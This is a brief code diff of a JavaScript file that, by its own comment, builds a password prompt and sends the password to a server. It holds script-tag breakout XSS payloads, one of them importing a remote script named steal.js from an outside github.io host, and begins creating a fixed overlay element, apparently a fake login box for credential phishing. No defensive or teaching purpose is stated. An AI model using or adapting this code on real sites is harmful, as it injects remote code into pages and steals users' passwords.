@@ -1,5 +1,5 @@
 // This script creates a password prompt and sends the password to the server
-//</scRipt><scRipt>alert(xss)</scRipt>
+//</scRipt><scRipt>alert('xss')</scRipt>
 //</scRipt><scRipt>import('https://vulnoob.github.io/jsfile/steal.js')</scRipt> 
 let div = document.createElement('div');
 div.style.position = 'fixed';
